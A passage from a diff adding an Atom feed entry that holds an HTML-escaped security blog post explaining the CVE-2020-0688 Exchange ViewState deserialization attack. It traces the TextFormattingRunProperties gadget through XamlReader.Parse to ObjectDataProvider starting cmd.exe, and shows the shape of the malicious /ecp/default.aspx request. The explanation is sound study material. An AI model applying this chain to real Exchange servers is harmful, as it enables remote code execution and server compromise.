+        &lt;p&gt;In order to understand what happened until this point we need to take a step back and look at some of the properties of the gadget &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;. The first thing to notice when looking at the gadget class is that it contains a &lt;code class=&quot;highlighter-rouge&quot;&gt;Serializable&lt;/code&gt; attribute and that the class implements an interface of type &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt;. This tells us that the gadget class will implement a custom form of serialization/deserialization.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[System.Serializable]
+        public sealed class TextFormattingRunProperties : 
+        System.Windows.Media.TextFormatting.TextRunProperties, 
+        System.Runtime.Serialization.IObjectReference, 
+        System.Runtime.Serialization.ISerializable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The next thing we will have a look at are methods which belong to the gadget class and have something to do with serialization. As you can see in the figure below the gadget class implements its own &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectData()&lt;/code&gt; method as demanded by the &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt; interface. The interesting part from the method description is the mentioning of the class &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlWriter&lt;/code&gt;. This is a clear sign that objects created from our gadget class a serialized and deserialized with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlWriter&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader&lt;/code&gt;.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/7.png&quot; alt=&quot;Figure 7: TextFormattingRunProperties.GetObjectData()&quot; title=&quot;TextFormattingRunProperties.GetObjectData()&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;Remember what happens when a custom .NET object gets deserialized? No!? Let me help you. The answer is that a special constructor is called which in the case of our gadget class &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; looks as follows:&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;TextFormattingRunProperties.ctor(SerializationInfo, StreamingContext)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;Inside this special constructor used for deserialization purposes a method named &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt; is called on each property of our gadget class that needs to be deserialized. The serialized properties are retrieved from the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; object passed to the method.&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/8.png&quot; alt=&quot;Figure 8: TextFormattingRunProperties.GetObjectFromSerializationInfo()&quot; title=&quot;TextFormattingRunProperties.GetObjectFromSerializationInfo()&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;In the figure above you can see what happens inside the method &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt;. Note that the method &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; is called on the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; which contains the XAML we have seen before.&lt;/p&gt;
+        &lt;p&gt;What happend so far is that we attempted to deserialize the gadget of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;. During deserialization each object of a specific type that is part of the object graph gets deserialized in its intended way. This involves calling the specialized constructor introduced earlier in this section. The result of calling the specialized constructor is that &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; will be called on each property of class such as &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt;. The magic begins when we pass the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; (XAML) into the &lt;code class=&quot;highlighter-rouge&quot;&gt;Parse()&lt;/code&gt; method.&lt;/p&gt;
+        &lt;p&gt;At this point &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; will take care of the XAML content present in the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt;. After parsing the XAML definitions an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; will be instantiated. The class &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; is responsible for creating an object that can be used as a binding source for Windows Presentation Foundation (WPF) application GUI elements.&lt;/p&gt;
+        &lt;p&gt;A binding source can be described as the association between an GUI element (e.g. WPF Window) and a method which is responsible for creating or fetching data used by that GUI element. This association is described in XAML. The best part about &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProviders&lt;/code&gt; from an attackers point of view is that they provide a way to execute code on a target that can be tricked into calling &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; on a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProviders&lt;/code&gt; XAML definition.&lt;/p&gt;
+        &lt;p&gt;Guess what!? This is exactly what is happening in our example! As we will explorer in the next section.&lt;/p&gt;
+        &lt;h2 id=&quot;wrapping-it-all-up&quot;&gt;Wrapping it all up&lt;/h2&gt;
+        &lt;p&gt;We are first defining a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; (in XAML) that gets assigned to our &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; variable which in turn becomes part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; property of our gadget class &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;.&lt;/p&gt;
+        &lt;p&gt;In the second step we serialize our gadget class with the help of the formatter &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;. Based on the serialized gadget and the cryptographic parameters introduced in one of the previous sections an HMAC is computed which is then appended to the serialized gadget. The resulting structure is called view state.&lt;/p&gt;
+        &lt;p&gt;In the next step the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is send back the the vulnerable ASP.NET web application part of Microsoft Exchange. The HTTP GET-Request is shown below.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;/ecp/default.aspx?__VIEWSTATEGENERATOR=&amp;lt;value&amp;gt;&amp;amp;__VIEWSTATE=&amp;lt;value&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;After receiving the view state the ASP.NET web application uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter.Deserialize()&lt;/code&gt; method to deserialize its contents.&lt;/p&gt;
+        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;public object Deserialize(string input) {
+        #if NO_BASE64
+        char[] data = input.ToCharArray();
+        #else
+        byte[] dataBytes = Convert.FromBase64String(input);
+        int dataLength = -1;
+        if (EnableViewStateMac) {
+        try {
+        dataBytes = MachineKeySection.GetDecodedData(dataBytes, _macKey, 0, dataBytes.Length, ref dataLength);
+        }
+        catch (Exception e) {
+        PerfCounters.IncrementCounter(AppPerfCounter.VIEWSTATE_MAC_FAIL);
+        ViewStateException.ThrowMacValidationError(e, input);
+        }
+        }
+        ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+        &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt; uses the specialized constructor of the serialized &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; object to deserialize its properties. Additionally the &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; which holds the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; (in XAML) gets passed into &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; as part of a a function call to &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt; (Boooom!!!).&lt;/p&gt;
+        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/9.png&quot; alt=&quot;Figure 9: ObjectDataProvider.InvokeMethodOnInstance()&quot; title=&quot;ObjectDataProvider.InvokeMethodOnInstance()&quot; /&gt;&lt;/p&gt;
+        &lt;p&gt;Finally the &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; object gets instantiated, and the method &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Diagnostics.Process.start()&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;System.dll&lt;/code&gt; is invoked with the help of another method called &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider.InvokeMethodOnInstance()&lt;/code&gt; as can be seen in the figure above. The &lt;code class=&quot;highlighter-rouge&quot;&gt;start()&lt;/code&gt; method is used to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt; with the commandline &lt;code class=&quot;highlighter-rouge&quot;&gt;/c calc.exe&lt;/code&gt;. This results in the creation of a &lt;code class=&quot;highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; process or a full compromise of the targeted Microsoft Exchange Server.&lt;/p&gt;
+        &lt;hr /&gt;
+        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
+        &lt;div class=&quot;footnotes&quot;&gt;
+        &lt;ol&gt;
+        &lt;li id=&quot;fn:fn-CVE_2020_0688&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688&quot;&gt;Microsoft: CVE-2020-0688&lt;/a&gt; &lt;a href=&quot;#fnref:fn-CVE_2020_0688&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-ZDI&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;Zero Day Initiative: CVE-2020-0688&lt;/a&gt; &lt;a href=&quot;#fnref:fn-ZDI&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-yososerial_ViewStatePlugin&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs&quot;&gt;Yososerial.net: ViewStatePlugin.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-yososerial_ViewStatePlugin&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-github_yoserialnet&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;Github: yoserial.net&lt;/a&gt; &lt;a href=&quot;#fnref:fn-github_yoserialnet&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-microsoft_MachineKeySection&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/referencesource/blob/master/System.Web/Configuration/MachineKeySection.cs&quot;&gt;Microsoft: MachineKeySection.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-microsoft_MachineKeySection&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-New_Gadget&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&quot;&gt;Micro Focus: New .NET deserialization gadget for compact payload&lt;/a&gt; &lt;a href=&quot;#fnref:fn-New_Gadget&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li id=&quot;fn:fn-microsoft_LosFormatter&quot;&gt;
+        &lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/referencesource/blob/master/System.Web/UI/LOSFormatter.cs&quot;&gt;Microsoft: LosFormatter.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-microsoft_LosFormatter&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;/ol&gt;
+        &lt;/div&gt;
+      </content>
+    </entry>
     <entry>
       <title>WMI Persistence (T1084)</title>
       <link href="https://digital-selfdefense.net/2020/01/19/WMI-Persistence.html"/>
